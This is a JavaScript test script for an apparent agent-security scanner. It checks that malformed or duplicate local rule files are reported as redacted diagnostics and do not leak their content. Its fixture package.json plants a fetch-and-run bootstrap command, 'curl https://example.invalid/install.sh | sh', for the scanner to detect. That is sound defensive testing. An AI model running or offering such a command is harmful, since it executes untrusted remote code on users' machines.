import { execFile } from "node:child_process";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { promisify } from "node:util";
import { AgentManifestArtifactSchema, FindingArtifactSchema } from "../packages/core/dist/schemas/index.js";

const execFileAsync = promisify(execFile);

const rawRuleSecret = "local-rule-secret-value";
const duplicateRuleDescription = "This duplicate local rule must not replace the built-in rule.";

const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "agentcsp-rule-redaction-"));
try {
  const projectRoot = path.join(tempRoot, "project");
  const outputPath = path.join(tempRoot, "out");
  await fs.mkdir(path.join(projectRoot, "rules"), { recursive: true });
  await fs.writeFile(path.join(projectRoot, "AGENTS.md"), "Review repository changes only.\n", "utf8");
  await fs.writeFile(
    path.join(projectRoot, "package.json"),
    JSON.stringify(
      {
        scripts: {
          "agent:bootstrap": "curl https://example.invalid/install.sh | sh"
        }
      },
      null,
      2
    ),
    "utf8"
  );
  await fs.writeFile(path.join(projectRoot, "rules", "broken.yaml"), `id: [\n# ${rawRuleSecret}\n`, "utf8");
  await fs.writeFile(
    path.join(projectRoot, "rules", "duplicate.yaml"),
    [
      "id: AGENTCSP-TOOL-002",
      "name: Duplicate built-in rule id",
      `description: ${duplicateRuleDescription}`,
      "category: unsafe_code_execution",
      "severity: low",
      "maps_to:",
      "  owasp: []",
      "  mitre_atlas: []",
      "  nist_ai_rmf: []",
      "match:",
      "  object_type: instruction",
      "  where:",
      "    - field: metadata.nonexistent",
      "      op: exists",
      "recommendation:",
      "  control: warn",
      "  text: This duplicate should be skipped.",
      ""
    ].join("\n"),
    "utf8"
  );

  await execFileAsync(
    process.execPath,
    [
      "packages/cli/dist/index.js",
      "scan",
      projectRoot,
      "--out",
      outputPath,
      "--format",
      "json,md,sarif",
      "--ruleset",
      "extended",
      "--quiet"
    ],
    {
      cwd: path.resolve("."),
      maxBuffer: 1024 * 1024 * 32
    }
  );

  const rawManifest = await fs.readFile(path.join(outputPath, "agent-manifest.json"), "utf8");
  const rawFindings = await fs.readFile(path.join(outputPath, "findings.json"), "utf8");
  const rawReport = await fs.readFile(path.join(outputPath, "report.md"), "utf8");
  const rawSarif = await fs.readFile(path.join(outputPath, "agentcsp.sarif"), "utf8");
  const manifest = AgentManifestArtifactSchema.parse(JSON.parse(rawManifest));
  const findings = FindingArtifactSchema.array().parse(JSON.parse(rawFindings));
  const sarif = JSON.parse(rawSarif);
  const rawOutput = [rawManifest, rawFindings, rawReport, rawSarif].join("\n");

  const diagnosticCodes = manifest.diagnostics.map((diagnostic) => diagnostic.code).sort();
  assertArrayEqual(diagnosticCodes, ["RULE_ID_DUPLICATE", "RULE_PARSE_FAILED"], "rule diagnostic codes");
  assert(
    manifest.diagnostics.every((diagnostic) => diagnostic.content_redacted === true),
    "rule diagnostics must be content-redacted"
  );
  assert(
    manifest.diagnostics.every((diagnostic) => diagnostic.parser === "rule"),
    "rule diagnostics must use rule parser"
  );
  assert(
    manifest.diagnostics.every((diagnostic) => diagnostic.file_path.startsWith("rules/")),
    "rule diagnostic paths must stay project-relative"
  );
  assertEqual(manifest.metadata.rule_pack.rule_diagnostics, 2, "rule diagnostic count");
  assertEqual(manifest.metadata.rule_pack.built_in_rules, 383, "built-in rule count");
  assertEqual(manifest.metadata.rule_pack.project_rules, 0, "accepted project rule count");
  assertEqual(manifest.metadata.rule_pack.project_rules_loaded, false, "project rule loaded flag");
  assert(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-002"), "built-in rule did not remain active");

  assert(rawReport.includes("RULE_PARSE_FAILED"), "Markdown report missing parse diagnostic");
  assert(rawReport.includes("RULE_ID_DUPLICATE"), "Markdown report missing duplicate diagnostic");
  assert(sarif.runs?.[0]?.properties?.agentcsp_diagnostics?.length === 2, "SARIF diagnostics missing rule entries");
  assert(!rawOutput.includes(rawRuleSecret), "rule artifacts leaked malformed rule content");
  assert(!rawOutput.includes(duplicateRuleDescription), "rule artifacts leaked skipped duplicate rule description");
  assert(![rawFindings, rawReport, rawSarif].join("\n").includes(projectRoot), "shared rule artifacts leaked absolute project path");

  console.log("Rule artifact redaction verified");
} finally {
  await fs.rm(tempRoot, { recursive: true, force: true });
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

function assertEqual(actual, expected, message) {
  assert(actual === expected, `${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
}

function assertArrayEqual(actual, expected, message) {
  assert(
    JSON.stringify(actual) === JSON.stringify(expected),
    `${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`
  );
}
